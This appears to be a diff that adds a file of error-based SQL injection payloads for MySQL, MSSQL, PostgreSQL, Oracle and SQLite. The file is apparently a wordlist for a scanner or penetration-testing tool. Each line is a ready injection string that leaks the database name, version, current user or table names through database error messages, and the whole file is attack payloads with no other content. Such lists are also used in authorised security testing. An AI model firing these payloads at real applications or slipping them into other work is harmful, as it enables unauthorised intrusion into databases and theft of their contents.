@@ -1,0 +1,28 @@
+# error_based — payloads that extract data through DB error messages
+# MySQL EXTRACTVALUE / UPDATEXML
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND GTID_SUBSET((SELECT version()),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))--
+# MySQL floor() error
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+# MSSQL conversion error
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int,db_name())--
+# PostgreSQL cast error
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT current_database()) AS int)--
+# Oracle xmltype
+' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)--
+# SQLite — force OperationalError via mismatched types (error message reflects in body)
+' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
+' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)--
+0 AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
+0 AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)--
